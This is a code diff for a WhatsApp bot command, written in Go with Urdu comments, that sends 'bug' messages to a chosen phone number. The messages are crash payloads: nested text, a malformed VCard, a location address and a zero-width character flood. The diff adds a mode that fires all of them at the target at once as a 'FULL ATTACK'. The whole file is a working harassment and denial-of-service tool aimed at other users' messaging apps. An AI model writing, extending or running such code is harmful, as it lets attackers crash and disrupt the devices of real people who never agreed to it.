@@ -27,11 +27,19 @@ func generateCrashPayload(length int) string {
 // ---------------------------------------------------------
 // 🚀 BUG HANDLER FUNCTION
 // ---------------------------------------------------------
+// ---------------------------------------------------------
+// 🚀 UPDATED: handleBugCommand (With "ALL" Mixer)
+// ---------------------------------------------------------
 func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) {
-	bugType := args[0]
+	if len(args) < 2 {
+		replyMessage(client, v, "⚠️ Usage: .bug <1-5> <number>\nTypes: 1=Text, 2=VCard, 3=Loc, 4=Flood, 5=ALL MIX")
+		return
+	}
+
+	bugType := strings.ToLower(args[0]) // lower case کر دیا تاکہ "all" بھی چلے
 	targetNum := args[1]
 
-	// 1. نمبر فارمیٹنگ
+	// 1. JID Parsing
 	if !strings.Contains(targetNum, "@") {
 		targetNum += "@s.whatsapp.net"
 	}
@@ -41,81 +49,55 @@ func handleSendBugs(client *whatsmeow.Client, v *events.Message, args []string) 
 		return
 	}
 
-	var msg *waProto.Message
-	var bugName string
-
-	// 2. چاروں لاجکس (479 Error سے بچنے کے لیے سائز کم کیا ہے)
+	// 2. LOGIC SWITCH
 	switch bugType {
 	
-	// 🔥 TYPE 1: Text Bomb (Nested Layers)
-	case "1":
-		bugName = "Text Nester (Type 1)"
-		// 2500 بہترین سائز ہے (نہ بہت بڑا، نہ بہت چھوٹا)
+	case "1": // Text Bomb
 		payload := "🚨 T-BUG 1 🚨\n" + generateCrashPayload(2500)
-		msg = &waProto.Message{Conversation: proto.String(payload)}
+		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(payload)})
 
-	// 📇 TYPE 2: VCard Bomb (Contact Parser)
-	case "2":
-		bugName = "VCard Parser (Type 2)"
-		// کانٹیکٹ نام میں وائرس
+	case "2": // VCard Bomb
 		virusName := generateCrashPayload(2000)
 		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", virusName, virusName)
-		msg = &waProto.Message{
-			ContactMessage: &waProto.ContactMessage{
-				DisplayName: proto.String("🔥 Virus 🔥"),
-				Vcard:       proto.String(vcard),
-			},
-		}
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥 Virus 🔥"), Vcard: proto.String(vcard)},
+		})
 
-	// 📍 TYPE 3: Location Bomb (UI Renderer)
-	case "3":
-		bugName = "Location UI (Type 3)"
-		// ایڈریس بار میں وائرس
+	case "3": // Location Bomb
 		virusAddr := generateCrashPayload(2000)
-		msg = &waProto.Message{
+		client.SendMessage(context.Background(), jid, &waProto.Message{
 			LocationMessage: &waProto.LocationMessage{
-				DegreesLatitude:  proto.Float64(24.8607),
-				DegreesLongitude: proto.Float64(67.0011),
-				Name:             proto.String("🚨 Crash Point"),
-				Address:          proto.String(virusAddr),
+				DegreesLatitude: proto.Float64(24.8607), DegreesLongitude: proto.Float64(67.0011),
+				Name: proto.String("🚨 Crash Point"), Address: proto.String(virusAddr),
 			},
-		}
+		})
 
-	// 📝 TYPE 4: Silent Flood (Memory Killer)
-	case "4":
-		bugName = "Memory Flood (Type 4)"
-		// یہ نظر نہیں آتا (Zero Width) لیکن میموری بھرتا ہے
-		// اس کا سائز تھوڑا بڑا رکھا جا سکتا ہے کیونکہ یہ سادہ ہے
-		flood := strings.Repeat("\u200b\u200c\u200d", 8000) 
-		msg = &waProto.Message{
-			ExtendedTextMessage: &waProto.ExtendedTextMessage{
-				Text: proto.String("🚨 SILENT 🚨" + flood),
-			},
-		}
+	case "4": // Memory Flood
+		flood := strings.Repeat("\u200b\u200c\u200d", 8000)
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			ExtendedTextMessage: &waProto.ExtendedTextMessage{Text: proto.String("🚨 SILENT 🚨" + flood)},
+		})
+
+	// 🔥 CASE 5: THE ULTIMATE MIXER (All in One)
+	case "5", "all":
+		replyMessage(client, v, "☢️ Launching FULL ATTACK on "+targetNum)
+		
+		// یہ ایک ہی وقت میں سب کچھ بھیجے گا
+		// 1. Text Bomb
+		client.SendMessage(context.Background(), jid, &waProto.Message{Conversation: proto.String(generateCrashPayload(2500))})
+		
+		// 2. VCard Bomb
+		vcard := fmt.Sprintf("BEGIN:VCARD\nVERSION:3.0\nN:;%s;;;\nFN:%s\nEND:VCARD", generateCrashPayload(1500), "VIRUS")
+		client.SendMessage(context.Background(), jid, &waProto.Message{ContactMessage: &waProto.ContactMessage{DisplayName: proto.String("🔥"), Vcard: proto.String(vcard)}})
+		
+		// 3. Location Bomb
+		client.SendMessage(context.Background(), jid, &waProto.Message{
+			LocationMessage: &waProto.LocationMessage{DegreesLatitude: proto.Float64(0), DegreesLongitude: proto.Float64(0), Address: proto.String(generateCrashPayload(2000))},
+		})
+
+		replyMessage(client, v, "✅ All Warheads Delivered! 💀")
 
 	default:
-		replyMessage(client, v, "❌ غلط ٹائپ! 1, 2, 3, 4 میں سے چنیں۔")
-		return
+		replyMessage(client, v, "❌ غلط ٹائپ! 1 سے 5 تک سلیکٹ کریں۔")
 	}
-
-	// 3. بھیجنا
-	fmt.Printf("🚀 Sending %s to %s\n", bugName, targetNum)
-	
-	// پہلے وارننگ (آپشنل)
-	// replyMessage(client, v, "🚀 Sending "+bugName+"...")
-
-	_, err = client.SendMessage(context.Background(), jid, msg)
-	if err != nil {
-		fmt.Println("❌ Error:", err)
-		replyMessage(client, v, "❌ Error: "+err.Error()) // اگر 479 آیا تو یہاں شو ہوگا
-	} else {
-		replyMessage(client, v, "✅ "+bugName+" Sent!")
-	}
-}
-
-// چھوٹا ہیلپر فنکشن (اگر نہیں ہے تو یہ بھی لگا لیں)
-func replyMessage(client *whatsmeow.Client, v *events.Message, text string) {
-	client.SendMessage(context.Background(), v.Info.Chat, &waProto.Message{
-		Conversation: proto.String(text),
-	})
 }
